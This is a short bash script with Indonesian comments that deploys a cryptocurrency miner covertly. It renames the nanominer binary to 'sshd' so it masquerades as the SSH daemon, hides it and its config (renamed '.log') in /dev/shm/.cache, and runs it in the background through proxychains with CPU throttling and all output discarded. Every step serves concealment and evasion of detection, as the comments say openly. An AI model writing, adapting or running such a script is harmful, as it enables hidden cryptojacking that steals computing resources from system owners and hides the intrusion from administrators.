#!/bin/bash

# Nama proses yang menyamar
PROC_NAME="sshd"

# Folder tempat miner tersembunyi
MINER_DIR="/dev/shm/.cache"
MINER_BIN="$MINER_DIR/$PROC_NAME"

# Cek apakah miner sudah berjalan
if pgrep -x "$PROC_NAME" > /dev/null
then
    echo "$PROC_NAME already running!"
    exit 1
fi

# Pastikan folder ada
mkdir -p $MINER_DIR

# Pindahkan miner ke folder tersembunyi
mv nanominer $MINER_BIN
mv config.ini $MINER_DIR/.log

# Beri izin eksekusi
chmod +x $MINER_BIN

# Jalankan dengan proxychains & batasi CPU
nohup ~/.local/bin/proxychains4 -f ~/.proxychains/proxychains.conf nice -n 19 cpulimit -e $PROC_NAME -l 50 -- $MINER_BIN > /dev/null 2>&1 &
